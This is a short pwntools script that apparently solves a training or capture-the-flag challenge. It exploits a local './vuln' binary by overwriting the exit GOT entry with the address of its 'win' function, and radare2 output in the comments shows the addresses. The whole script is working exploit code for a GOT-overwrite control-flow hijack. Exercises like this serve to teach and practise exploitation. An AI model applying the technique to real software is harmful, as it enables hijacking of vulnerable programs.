from pwn import *

# Set up pwntools for the correct architecture
context.binary = './vuln'

import os

io = process(context.binary.path)


#create copy of binary
elf = context.binary

#access got and symbols to take addresses
exit_got = elf.got['exit']
win_addr = elf.symbols['win']

log.info("Address of 'exit' .got.plt entry: {}".format(hex(exit_got)))
log.info("Address of 'win': {}".format(hex(win_addr)))

#or since PIE is not involved, they will have a specific address depending on the binary
#(recompiling with make could change function addresses)

# $ r2 ./vuln
# [0x080484b0]> aaaa
# [0x080484b0]> afl~win
# 0x080485c6    3 153          sym.win
# [0x080484b0]> afl~exit
# 0x08048460    1 6            sym.imp.exit
# [0x080484b0]> pdf @ sym.imp.exit
# / (fcn) sym.imp.exit 6
# \           0x08048460      ff251ca00408   jmp dword [reloc.exit]      ; 0x804a01c ; "f\x84\x04\bv\x84\x04\b\x86\x84\x04\b\x96\x84\x04\b"

#exit_got = 0x804a01c
#win_addr = 0x080485c6

#override got exit entry with win address
io.sendlineafter('address\n', str(exit_got))
io.sendlineafter('value?\n', str(win_addr))


#print result
print(io.recvall())